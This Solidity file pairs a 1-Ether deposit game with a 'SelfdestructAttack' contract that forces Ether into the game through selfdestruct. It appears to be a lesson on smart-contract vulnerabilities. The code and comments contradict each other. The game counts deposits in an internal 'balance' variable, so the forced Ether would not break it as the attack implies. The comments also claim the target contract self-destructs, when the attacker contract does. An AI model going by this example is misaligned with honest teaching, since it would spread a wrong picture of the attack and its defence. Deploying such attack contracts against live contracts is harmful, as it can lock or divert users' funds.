// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title SelfdestructContract
/// @notice A contract that allows users to deposit Ether and claim a reward when a target amount is reached.
contract SelfdestructContract {
    uint public targetAmount = 7 ether;
    uint public balance;
    address public winner;

    /// @notice Deposits 1 Ether into the contract for the caller's account.
    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    /// @notice Claims the reward for the winner.
    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}

/// @title SelfdestructAttack
/// @notice A contract representing an attack on the SelfdestructContract by triggering self-destruct on the target contract.
contract SelfdestructAttack {
    SelfdestructContract target;

    /// @notice Constructs the SelfdestructAttack contract, specifying the address of the target SelfdestructContract.
    /// @param _target The address of the SelfdestructContract to attack.
    constructor(SelfdestructContract _target) {
        target = SelfdestructContract(_target);
    }

    /// @notice Initiates the attack by triggering self-destruct on the target contract.
    function attack() public payable {
        address payable addr = payable(address(target));
        selfdestruct(addr);
    }
}
